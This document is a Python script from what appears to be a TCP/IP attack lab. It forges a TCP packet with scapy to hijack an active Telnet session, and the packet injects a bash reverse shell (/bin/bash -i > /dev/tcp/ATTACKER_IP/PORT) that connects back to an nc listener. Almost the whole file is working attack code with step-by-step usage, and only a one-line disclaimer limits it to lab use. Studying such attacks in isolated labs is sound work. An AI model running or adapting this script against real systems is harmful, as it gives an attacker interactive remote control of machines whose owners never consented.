#!/usr/bin/env python3
"""
Reverse Shell via TCP Session Hijacking — TCP/IP Attack Lab
=============================================================
Injects a bash reverse shell command into an active Telnet session,
giving the attacker a persistent, interactive terminal on the victim.

Unlike Task 3 (single command injection), a reverse shell provides:
  ✦ Interactive terminal — run any command
  ✦ Persistent access — stays alive until closed
  ✦ Bypasses inbound firewalls — victim CALLS BACK to attacker
  ✦ Full I/O — stdin, stdout, stderr all tunneled

Reverse Shell Command Explained:
    /bin/bash -i > /dev/tcp/ATTACKER_IP/PORT 2>&1 0<&1
    │              │                         │      │
    │              │                         │      └─ stdin  ← attacker keyboard
    │              │                         └──── stderr → attacker (errors)
    │              └── stdout → TCP socket to attacker
    └── interactive bash shell

Usage:
    Step 1 — Start listener on ATTACKER machine:
        nc -lv 9090

    Step 2 — Update Wireshark values below, then run:
        sudo python3 tcpreverseshell.py

    Step 3 — Shell connects back to nc listener.
             Run 'ifconfig' to confirm you're on the victim.

WARNING: For educational use in isolated lab environments only.
"""

from scapy.all import IP, TCP, send, ls

# ── Attacker listener (must run 'nc -lv 9090' before sending) ─────────
ATTACKER_IP   = "10.9.0.1"
ATTACKER_PORT = 9090
# ──────────────────────────────────────────────────────────────────────

# ── Values extracted from Wireshark (same method as Task 3) ───────────
CLIENT_IP   = "10.9.0.5"
SERVER_IP   = "10.9.0.6"
CLIENT_PORT = 39714
SERVER_PORT = 23
SEQ_NUM     = 1810434171
ACK_NUM     = 9935746
# ──────────────────────────────────────────────────────────────────────

# The reverse shell payload:
# \r clears terminal buffer, \n executes, shell connects back to attacker
PAYLOAD = f'\r /bin/bash -i > /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 2>&1 0<&1 \n'

print("[*] Reverse Shell Injection via Session Hijacking")
print(f"    Shell will connect back to: {ATTACKER_IP}:{ATTACKER_PORT}")
print(f"    Injecting into session: {CLIENT_IP}:{CLIENT_PORT} → {SERVER_IP}:{SERVER_PORT}")
print(f"\n[!] Make sure 'nc -lv {ATTACKER_PORT}' is running on {ATTACKER_IP}\n")

ip  = IP(src=CLIENT_IP, dst=SERVER_IP)
tcp = TCP(sport=CLIENT_PORT, dport=SERVER_PORT,
          flags="A",
          seq=SEQ_NUM,
          ack=ACK_NUM)
pkt = ip / tcp / PAYLOAD

print("Sending Hijacking Packet for reverse shell...\n")
ls(pkt)

send(pkt, verbose=0)

print(f"\n[✔] Reverse shell command injected.")
print(f"[*] Check your nc listener on port {ATTACKER_PORT}.")
print(f"[*] If shell connects, run 'ifconfig' to confirm victim identity.")
